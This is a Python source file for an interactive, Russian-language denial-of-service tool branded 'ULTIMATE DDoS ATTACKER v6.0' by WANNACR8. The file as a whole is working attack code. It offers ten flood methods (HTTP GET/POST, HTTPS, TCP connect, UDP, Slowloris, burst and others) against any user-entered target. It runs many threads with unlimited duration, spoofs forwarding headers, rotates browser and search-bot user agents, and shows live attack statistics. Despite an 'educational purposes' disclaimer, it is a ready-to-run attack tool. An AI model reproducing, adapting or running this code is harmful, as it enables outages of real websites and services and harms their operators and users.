import os
import sys
import time
import random
import threading
import socket
import requests
import json
import urllib3
import platform
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from collections import deque

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
    HEADER = WHITE
    BLUE = WHITE
    CYAN = WHITE
    GREEN = WHITE
    YELLOW = WHITE
    RED = WHITE
    MAGENTA = WHITE

DISCLAIMER = f"""
{Colors.WHITE}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║              СДЕЛАНО В ОБУЧАТЕЛЬНЫХ И ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                 ║
║                                                                              ║
║  Данный инструмент создан исключительно для:                                ║
║  • Изучения принципов работы сетевых протоколов                             ║
║  • Понимания механизмов DDoS атак                                           ║
║  • Тестирования собственных серверов на устойчивость                        ║
║  • Образовательных целей в области кибербезопасности                        ║
║                                                                              ║
║  Использование против серверов без разрешения владельца                     ║
║  ЯВЛЯЕТСЯ НЕЗАКОННЫМ и преследуется по закону!                              ║
║                                                                              ║
║  Автор (WANNACR8) не несет ответственности за ваши действия                 ║
║  и призывает использовать знания ТОЛЬКО в законных целях!                   ║
║                                                                              ║
║  Используя данный инструмент, вы подтверждаете, что:                        ║
║  1. Вам есть 18+ лет                                                         ║
║  2. Вы будете использовать его только на своих серверах                      ║
║  3. Вы понимаете юридические последствия незаконного использования          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
"""

LOGO = f"""
{Colors.WHITE}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    8888888888 8888888b.  8888888888 88888888888 8888888888 8888888b.        ║
║    888        888   Y88b 888            888     888        888   Y88b       ║
║    888        888    888 888            888     888        888    888       ║
║    8888888    888   d88P 8888888        888     8888888    888   d88P       ║
║    888        8888888P   888            888     888        8888888P         ║
║    888        888 T88b   888            888     888        888              ║
║    888        888  T88b  888            888     888        888              ║
║    8888888888 888   T88b 888            888     8888888888 888              ║
║                                                                              ║
║                         BY WANNACR8                                         ║
║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                        ║
║                         26.09.2025                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
"""

class UltimateDDoSAttacker:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.threads = 100
        self.duration = 60
        self.method = "HTTP"
        self.attacking = False
        self.paused = False
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'bytes': 0,
            'start_time': 0,
            'peak_speed': 0,
            'response_times': deque(maxlen=100)
        }
        self.lock = threading.Lock()
        self.workers = []
        self.proxies = []
        self.use_proxy = False
        self.disclaimer_shown = False
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ]
        
        self.payloads = []
        for i in range(100):
            size = random.randint(512, 4096)
            self.payloads.append(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)))
            
        self.attack_patterns = {
            'HTTP_GET': self.http_get_attack,
            'HTTP_POST': self.http_post_attack,
            'HTTPS': self.https_attack,
            'TCP_SYN': self.tcp_syn_attack,
            'UDP_FLOOD': self.udp_flood_attack,
            'SLOWLORIS': self.slowloris_attack,
            'MIXED': self.mixed_attack,
            'RAPID_FIRE': self.rapid_fire_attack,
            'STEALTH': self.stealth_attack,
            'BURST': self.burst_attack
        }
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_disclaimer(self):
        self.clear_screen()
        print(DISCLAIMER)
        print(f"\n{Colors.WHITE}Нажмите ENTER чтобы подтвердить ознакомление и продолжить...{Colors.END}")
        input()
        self.disclaimer_shown = True
        
    def print_header(self):
        self.clear_screen()
        print(LOGO)
        
    def get_cpu_cores(self):
        try:
            import multiprocessing
            cores = multiprocessing.cpu_count()
            system_info = f"{platform.system()} {platform.release()}"
            python_version = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
            return cores, system_info, python_version
        except:
            return 4, "Unknown", "3.9"
            
    def show_menu(self):
        cores, system, python_ver = self.get_cpu_cores()
        
        print(f"{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
        print(f"║                     КОНФИГУРАЦИЯ АТАКИ                         ║")
        print(f"╠════════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                    ║")
        print(f"║  СИСТЕМНАЯ ИНФОРМАЦИЯ:                                             ║")
        print(f"║  ──────────────────────────────────────────────────────────────   ║")
        print(f"║  • ОС: {system:<51} ║")
        print(f"║  • Python: {python_ver:<51} ║")
        print(f"║  • CPU Ядер: {cores:<49} ║")
        print(f"║  • Макс. потоков: {cores * 50:<46} ║")
        print(f"║                                                                    ║")
        print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.WHITE}[?] Введите цель атаки (URL/IP):{Colors.END}")
        self.target = input(f"{Colors.WHITE}> {Colors.END}").strip()
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
            
        print(f"\n{Colors.WHITE}[?] Введите порт (по умолчанию 80):{Colors.END}")
        port_input = input(f"{Colors.WHITE}> {Colors.END}").strip()
        self.port = int(port_input) if port_input else 80
        
        print(f"\n{Colors.WHITE}[?] Количество потоков (рекомендуется {cores * 25}):{Colors.END}")
        threads_input = input(f"{Colors.WHITE}> {Colors.END}").strip()
        self.threads = int(threads_input) if threads_input else cores * 25
        
        print(f"\n{Colors.WHITE}[?] Длительность атаки в секундах (0 = бесконечно):{Colors.END}")
        duration_input = input(f"{Colors.WHITE}> {Colors.END}").strip()
        self.duration = int(duration_input) if duration_input else 60
        
        print(f"\n{Colors.WHITE}[?] Использовать прокси? (y/n):{Colors.END}")
        proxy_input = input(f"{Colors.WHITE}> {Colors.END}").strip().lower()
        self.use_proxy = proxy_input == 'y'
        
        print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
        print(f"║                     ВЫБЕРИТЕ МЕТОД АТАКИ                        ║")
        print(f"╠════════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                    ║")
        print(f"║  1. HTTP GET Flood     - Быстрая GET атака                        ║")
        print(f"║  2. HTTP POST Flood    - POST с большими данными                  ║")
        print(f"║  3. HTTPS Flood        - SSL/TLS атака                            ║")
        print(f"║  4. TCP SYN Flood      - TCP соединения                           ║")
        print(f"║  5. UDP Flood          - UDP пакеты                               ║")
        print(f"║  6. Slowloris          - Медленная атака (держит соединения)      ║")
        print(f"║  7. Mixed              - Комбинация всех методов                  ║")
        print(f"║  8. Rapid Fire         - Очень быстрая атака (макс. скорость)     ║")
        print(f"║  9. Stealth            - Скрытная атака (медленно, незаметно)     ║")
        print(f"║ 10. Burst              - Атака импульсами                         ║")
        print(f"║                                                                    ║")
        print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.WHITE}[?] Выберите метод (1-10):{Colors.END}")
        method_choice = input(f"{Colors.WHITE}> {Colors.END}").strip()
        
        method_map = {
            '1': 'HTTP_GET',
            '2': 'HTTP_POST',
            '3': 'HTTPS',
            '4': 'TCP_SYN',
            '5': 'UDP_FLOOD',
            '6': 'SLOWLORIS',
            '7': 'MIXED',
            '8': 'RAPID_FIRE',
            '9': 'STEALTH',
            '10': 'BURST'
        }
        
        self.method = method_map.get(method_choice, 'HTTP_GET')
        
    def show_config(self):
        print(f"\n{Colors.WHITE}╔════════════════════════════════════════════════════════════════════╗")
        print(f"║                     КОНФИГУРАЦИЯ АТАКИ                         ║")
        print(f"╠════════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                    ║")
        print(f"║  • Цель: {self.target:<57} ║")
        print(f"║  • Порт: {self.port:<58} ║")
        print(f"║  • Потоки: {self.threads:<56} ║")
        print(f"║  • Длительность: {self.duration if self.duration > 0 else 'Бесконечно':<51} ║")
        print(f"║  • Метод: {self.method:<57} ║")
        print(f"║  • Прокси: {'Да' if self.use_proxy else 'Нет':<58} ║")
        print(f"║                                                                    ║")
        print(f"║  BY WANNACR8                                                      ║")
        print(f"║  СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                                  ║")
        print(f"║                                                                    ║")
        print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.WHITE}[!] Нажмите ENTER для запуска атаки или Ctrl+C для отмены...{Colors.END}")
        input()
        
    def http_get_attack(self):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        
        while self.attacking and not self.paused:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                if random.random() > 0.5:
                    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                start_time = time.time()
                r = session.get(self.target, headers=headers, timeout=5, verify=False)
                response_time = time.time() - start_time
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(r.content)
                    self.stats['response_times'].append(response_time)
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def http_post_attack(self):
        session = requests.Session()
        
        while self.attacking and not self.paused:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*'
                }
                
                data = random.choice(self.payloads)
                
                start_time = time.time()
                r = session.post(self.target, data=data, headers=headers, timeout=5, verify=False)
                response_time = time.time() - start_time
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(data) + len(r.content)
                    self.stats['response_times'].append(response_time)
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def https_attack(self):
        session = requests.Session()
        
        while self.attacking and not self.paused:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = session.get(self.target, headers=headers, timeout=5, verify=False)
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(r.content)
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def tcp_syn_attack(self):
        while self.attacking and not self.paused:
            try:
                host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, self.port))
                sock.close()
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['total'] += 1
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def udp_flood_attack(self):
        while self.attacking and not self.paused:
            try:
                host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(random.randint(512, 1400))
                sock.sendto(data, (host, self.port))
                sock.close()
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['total'] += 1
                    self.stats['bytes'] += len(data)
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def slowloris_attack(self):
        while self.attacking and not self.paused:
            try:
                host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, self.port))
                
                sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                
                for _ in range(random.randint(5, 10)):
                    if not self.attacking or self.paused:
                        break
                    sock.send(f"X-Random-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                    time.sleep(random.uniform(5, 15))
                    
                sock.close()
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['total'] += 1
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def mixed_attack(self):
        attacks = [self.http_get_attack, self.http_post_attack, self.tcp_syn_attack, 
                  self.udp_flood_attack, self.slowloris_attack]
        random.choice(attacks)()
        
    def rapid_fire_attack(self):
        session = requests.Session()
        
        while self.attacking and not self.paused:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = session.get(self.target, headers=headers, timeout=2, verify=False)
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(r.content)
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def stealth_attack(self):
        session = requests.Session()
        
        while self.attacking and not self.paused:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = session.get(self.target, headers=headers, timeout=5, verify=False)
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(r.content)
                    
                time.sleep(random.uniform(0.5, 2))
                
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def burst_attack(self):
        burst_size = random.randint(10, 50)
        burst_count = 0
        
        while self.attacking and not self.paused:
            try:
                session = requests.Session()
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = session.get(self.target, headers=headers, timeout=3, verify=False)
                
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['bytes'] += len(r.content)
                    
                burst_count += 1
                
                if burst_count >= burst_size:
                    time.sleep(random.uniform(1, 3))
                    burst_size = random.randint(10, 50)
                    burst_count = 0
                    
            except:
                with self.lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def show_stats(self):
        last_total = 0
        last_time = time.time()
        
        while self.attacking:
            self.clear_screen()
            print(LOGO)
            
            elapsed = time.time() - self.stats['start_time']
            
            current_time = time.time()
            time_diff = current_time - last_time
            if time_diff > 0:
                current_speed = (self.stats['total'] - last_total) / time_diff
                if current_speed > self.stats['peak_speed']:
                    self.stats['peak_speed'] = current_speed
                last_total = self.stats['total']
                last_time = current_time
            else:
                current_speed = 0
                
            avg_speed = self.stats['total'] / elapsed if elapsed > 0 else 0
            success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
            
            avg_response = sum(self.stats['response_times']) / max(len(self.stats['response_times']), 1)
            
            if self.duration > 0:
                progress = min(100, (elapsed / self.duration) * 100)
                bar_length = 50
                filled = int(bar_length * progress / 100)
                bar = '█' * filled + '░' * (bar_length - filled)
                time_display = f"{elapsed:.1f}/{self.duration}"
            else:
                bar = '█' * 50
                progress = 0
                time_display = f"{elapsed:.1f}/∞"
                
            if self.duration > 0 and elapsed > 0:
                eta = max(0, self.duration - elapsed)
                eta_display = f"{eta:.1f} сек"
            else:
                eta_display = "∞"
                
            print(f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║                             LIVE ATTACK STATISTICS                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ТЕКУЩАЯ ЦЕЛЬ: {self.target[:60]:<60} ║
║  МЕТОД: {self.method:<20} ПОТОКИ: {self.threads:<10}                      ║
║                                                                              ║
║  ╔════════════════════════════════════════════════════════════════════════╗  ║
║  ║                      ДЕТАЛЬНАЯ СТАТИСТИКА                              ║  ║
║  ╠════════════════════════════════════════════════════════════════════════╣  ║
║  ║                                                                        ║  ║
║  ║  ● ВСЕГО ЗАПРОСОВ: {self.stats['total']:<15}                                   ║  ║
║  ║  ● ✅ УСПЕШНЫХ: {self.stats['success']:<15}                                      ║  ║
║  ║  ● ❌ ПРОВАЛЕННЫХ: {self.stats['failed']:<15}                                     ║  ║
║  ║  ● 📊 ПРОЦЕНТ УСПЕХА: {success_rate:>5.1f}%                                         ║  ║
║  ║                                                                        ║  ║
║  ║  ● ⚡ ТЕКУЩАЯ СКОРОСТЬ: {current_speed:>8.0f} ЗАПРОСОВ/СЕК                             ║  ║
║  ║  ● 📈 ПИКОВАЯ СКОРОСТЬ: {self.stats['peak_speed']:>8.0f} ЗАПРОСОВ/СЕК                         ║  ║
║  ║  ● 📉 СРЕДНЯЯ СКОРОСТЬ: {avg_speed:>8.0f} ЗАПРОСОВ/СЕК                             ║  ║
║  ║                                                                        ║  ║
║  ║  ● 📦 ПЕРЕДАНО ДАННЫХ: {self.stats['bytes']/1024/1024:>5.1f} МБ                                 ║  ║
║  ║  ● ⏱️ СРЕДНЕЕ ВРЕМЯ ОТВЕТА: {avg_response*1000:>5.1f} МС                               ║  ║
║  ║  ● 🕒 ПРОШЛО: {time_display:<10} СЕК                                 ║  ║
║  ║  ● ⏳ ETA: {eta_display:<10}                                          ║  ║
║  ║                                                                        ║  ║
║  ╚════════════════════════════════════════════════════════════════════════╝  ║
║                                                                              ║
║  ПРОГРЕСС: [{bar}] {progress:>3.0f}%                                      ║
║                                                                              ║
║  СТАТУС: {'АКТИВНА' if self.attacking else 'ОСТАНОВЛЕНА':<20}                                ║
║  {'ПАУЗА' if self.paused else 'АТАКА':<20}                                                ║
║                                                                              ║
║  ╔════════════════════════════════════════════════════════════════════════╗  ║
║  ║                         BY WANNACR8                                    ║  ║
║  ║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                  ║  ║
║  ║                         26.09.2025                                     ║  ║
║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
║  ╚════════════════════════════════════════════════════════════════════════╝  ║
║                                                                              ║
║  [КОМАНДЫ] P - Пауза | R - Возобновить | S - Статистика | Q - Выход         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
            
            time.sleep(0.5)
            
    def start_attack(self):
        self.attacking = True
        self.paused = False
        self.stats['start_time'] = time.time()
        
        print(f"\n{Colors.WHITE}[✓] АТАКА ЗАПУЩЕНА!{Colors.END}")
        print(f"{Colors.WHITE}[!] Нажмите P для паузы, R для возобновления, Q для выхода{Colors.END}")
        time.sleep(2)
        
        attack_method = self.attack_patterns.get(self.method, self.http_get_attack)
        
        for i in range(self.threads):
            t = threading.Thread(target=attack_method)
            t.daemon = True
            t.start()
            self.workers.append(t)
            
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            if self.duration > 0:
                end_time = time.time() + self.duration
                while self.attacking and time.time() < end_time:
                    time.sleep(0.1)
            else:
                while self.attacking:
                    time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
            
    def stop_attack(self):
        self.attacking = False
        elapsed = time.time() - self.stats['start_time']
        
        self.clear_screen()
        print(LOGO)
        
        success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
        avg_speed = self.stats['total'] / elapsed if elapsed > 0 else 0
        
        print(f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║                           АТАКА ЗАВЕРШЕНА                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ╔════════════════════════════════════════════════════════════════════════╗  ║
║  ║                      ФИНАЛЬНАЯ СТАТИСТИКА                             ║  ║
║  ╠════════════════════════════════════════════════════════════════════════╣  ║
║  ║                                                                        ║  ║
║  ║  ● ВСЕГО ЗАПРОСОВ:      {self.stats['total']:<15}                               ║  ║
║  ║  ● УСПЕШНЫХ:            {self.stats['success']:<15}                               ║  ║
║  ║  ● ПРОВАЛЕННЫХ:         {self.stats['failed']:<15}                               ║  ║
║  ║  ● ПРОЦЕНТ УСПЕХА:      {success_rate:>5.1f}%                                         ║  ║
║  ║                                                                        ║  ║
║  ║  ● СРЕДНЯЯ СКОРОСТЬ:    {avg_speed:>8.0f} ЗАПРОСОВ/СЕК                             ║  ║
║  ║  ● ПИКОВАЯ СКОРОСТЬ:    {self.stats['peak_speed']:>8.0f} ЗАПРОСОВ/СЕК                         ║  ║
║  ║  ● ПЕРЕДАНО ДАННЫХ:     {self.stats['bytes']/1024/1024:>5.1f} МБ                                 ║  ║
║  ║  ● ВРЕМЯ АТАКИ:         {elapsed:.1f} СЕК                                      ║  ║
║  ║                                                                        ║  ║
║  ╚════════════════════════════════════════════════════════════════════════╝  ║
║                                                                              ║
║  ╔════════════════════════════════════════════════════════════════════════╗  ║
║  ║                         BY WANNACR8                                    ║  ║
║  ║              ULTIMATE DDoS ATTACKER v6.0 EDUCATIONAL                  ║  ║
║  ║                         26.09.2025                                     ║  ║
║  ║              СДЕЛАНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ                          ║  ║
║  ╚════════════════════════════════════════════════════════════════════════╝  ║
║                                                                              ║
║              СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ ИНСТРУМЕНТА WANNACR8!                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
        
        input(f"\n{Colors.WHITE}Нажмите ENTER для выхода...{Colors.END}")
        
    def run(self):
        if not self.disclaimer_shown:
            self.print_disclaimer()
        
        try:
            self.print_header()
            self.show_menu()
            self.show_config()
            self.start_attack()
        except KeyboardInterrupt:
            self.stop_attack()
        except Exception as e:
            print(f"\n{Colors.WHITE}Ошибка: {e}{Colors.END}")
            time.sleep(2)

if __name__ == "__main__":
    attacker = UltimateDDoSAttacker()
    attacker.run()
